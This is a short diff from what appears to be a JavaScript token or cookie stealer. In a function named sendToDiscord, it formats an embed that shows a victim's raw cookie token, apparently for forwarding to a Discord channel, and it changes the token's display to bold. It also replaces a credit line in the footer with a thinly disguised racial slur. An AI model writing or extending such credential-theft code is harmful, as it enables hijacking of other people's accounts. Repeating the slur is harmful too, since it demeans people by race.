@@ -2194,14 +2194,14 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
 
         ],
         footer: {
-          text: "Made By .gg/sZbFX2wPVz"
+          text: "Made By .Niqqa"
         }
       };
 
       // Second embed: Cookie only - display the raw token value in description with code block formatting
       const cookieEmbed = {
         title: "🍪 Cookie",
-        description: "```" + token + "```",
+        description: "**```" + token + "```**",
         color: 0x8B5CF6,
         footer: {
           text: "Handle with extreme caution!"
